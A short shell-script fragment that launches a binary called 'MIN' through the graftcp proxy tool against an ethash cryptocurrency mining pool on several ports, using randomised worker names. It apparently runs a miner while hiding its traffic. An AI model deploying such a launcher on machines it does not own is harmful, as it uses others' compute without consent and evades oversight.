...
./graftcp/graftcp ./MIN --url=skyforce.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:8888 --log --extra 
sleep 2
./graftcp/graftcp ./MIN --url=skyforce.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
sleep 2
./graftcp/graftcp ./MIN --url=skyforce.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
